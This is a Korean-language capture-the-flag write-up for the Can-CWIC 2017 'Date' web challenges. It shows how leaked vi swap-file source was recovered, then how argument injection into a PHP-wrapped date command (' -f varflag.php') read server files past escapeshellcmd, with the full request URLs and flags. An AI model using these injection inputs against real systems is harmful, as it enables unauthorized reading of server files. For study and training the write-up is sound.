# [WEB] Can-CWIC CTF 2017- Date 1, 2

# Description
### date 1
Never be late to a romantic appointment again!

[The Date of Today][webpage]

Can you find the easy flag?

### date 2
Can you find the real flag?

[The Date of Today][webpage]

# Analysis
date1, 2는 같은 페이지를 대상으로 한다.
페이지에 접속하면 뭔가 굉장히 많이본 리눅스 명령어인 date의 사용 설명서와 이를 실행하는 것 같다.

http://159.203.38.169:5675/.index.php.swp 에서 vi의 백업 파일을 얻을 수 있었다.

이를 통해 얻은 소스 중 php부분을 보면 다음과 같다.
```php
<!-- 생략 -->
<h1>
<?php
$cmd = 'date';
$fmt = isset($_GET['fmt'])?$_GET['fmt']:"";
if (isset($_GET['rfc'])) {
	$cmd = $cmd . ' -R';
	$rfcx = ' checked';
}
if ($fmt != "") {
	$cmd = $cmd . ' +' . $fmt;
	$fmtx = ' value="' . $fmt . '"';

}
$cmd = escapeshellcmd($cmd);
$res = system($cmd . " 2>&1");

include 'varflag.php';
if ($res === $date && strpos($fmt, 'easter') != false) {
	echo "<b style='color:red'>$flag</b>";
}
?>
</h1>
	<br>
	<form action="index.php" method="GET">
	<div class="form-group">
	  <label>Format : </label>
	  <input type="text" name="fmt" class="form-control"<?=$fmtx?>></input>
	  </div>
	<div class="checkbox">
	<label><input type="checkbox" name="rfc"<?=$rfcx?>>RFC 2822</label>
	  </div>


	  <input type="submit" class="pull-right btn btn-primary"
	    value="Update"></input>
	</form>
	<br>
<!-- 생략 -->
```
system 함수를 통해 date 명령어를 실행한다.
또한 varflag.php안에 $flag변수가 있는 것으로 추측된다.

# Exploit
Date 1. Command Injection

Date 2. Date Command

## Date 1. Command Injection
system 을 사용하기는 하나 escapeshellcmd에 의해 command injection이 불가능하다.
> 참조 : http://php.net/manual/en/function.escapeshellcmd.php

그러나 date의 옵션 중 -f 옵션을 이용해 파일을 읽을 수 있다.

fmt파라미터로 ` -f varflag.php`를 요청하면 다름과 같은 페이지 정보를 얻을 수 있다.
```html
<!-- http://159.203.38.169:5675/?fmt=%20-f%20varflag.php -->
    <div class="panel panel-default centered">
      <div class="panel-heading"><h1>The Date of Today</h1></div>
      <div class="panel-body">
<h1>
date: invalid date '<?php'
date: invalid date '$date = "Sunday April 1st 2018. 2018-04-01";'
date: invalid date '$easy_flag = "FLAG{Want Love? Don\'t Date!}";'

date: invalid date '?>'
</h1>
	<br>
	<form action="index.php" method="GET">
	<div class="form-group">
	  <label>Format : </label>
	  <input type="text" name="fmt" class="form-control" value=" -f varflag.php"></input>
	  </div>
	<div class="checkbox">
	<label><input type="checkbox" name="rfc">RFC 2822</label>
	  </div>


	  <input type="submit" class="pull-right btn btn-primary"
	    value="Update"></input>
	</form>
	<br>
```

varflag.php안에 `$easy_flag = "FLAG{Want Love? Don\'t Date!}"`가 존재하였다.

**FLAG{Want Love? Don\'t Date!}**

## Date 2. Date Command
fmt 파라미터로 ` -f index.php`를 요청하면 처음에 얻은 `.index.php.swp`이랑 소스가 조금 다른것을 확인할 수 있다.
```php
# .index.php.swp
$cmd = escapeshellcmd($cmd);
$res = system($cmd . " 2>&1");

include 'varflag.php';
if ($res === $date && strpos($fmt, 'easter') != false) {
	echo "<b style='color:red'>$flag</b>";
}

# index.php
$cmd = escapeshellcmd($cmd);
$res = system("timeout 5s " . $cmd . " 2>&1");

include 'varflag.php';
if ($res === $date && (strpos($fmt, 'easter') != false || preg_match('/[0-9]/', $fmt) == 0)) {'
    echo "<b style='color:red'>$flag</b>";
}
```
system안에 timeout 명령어가 추가한건 /var/log/apache2/access.log와 같은 파일을 읽는 것을 방지하며, 서버 부하를 줄이기 위함인 것 같다.
그리고 if문 또한 변경되었는데 system 명령어의 결과 값이 위에서 찾은 varflag.php의 $date인 `Sunday April 1st 2018. 2018-04-01`이며, easter 문자열과 숫자가 들어가면 안된다.

date의 FORMAT을 `date +"%A %B %-dst %Y. %Y-%m-%d"`을 통해 `Tuesday October 10st 2017. 2017-10-10`의 형태로 바꿔준다.

또한 date의 옵션 중 `--date`를 통해 원하는 날짜로 변경을 한다.
> yesterday, last month, next year

이를 이용해 `fmt="%A %B %-dst %Y. %Y-%m-%d" --date "last month last month last month last month last month last month yesterday yesterday yesterday yesterday yesterday yesterday yesterday yesterday yesterday next year"`를 서버에 요청하면 플래그를 얻을 수 있다.
```
# http://159.203.38.169:5675/?fmt=%22%A%20%B%20%-dst%20%Y.%20%Y-%m-%d%22%20--date%20%22last%20month%20last%20month%20last%20month%20last%20month%20last%20month%20last%20month%20yesterday%20yesterday%20yesterday%20yesterday%20yesterday%20yesterday%20yesterday%20yesterday%20yesterday%20next%20year%22

Sunday April 1st 2018. 2018-04-01 
FLAG{EASTER2018ISAFOOLSDAY}
```


**FLAG{EASTER2018ISAFOOLSDAY}**

[webpage]:http://159.203.38.169:5675/

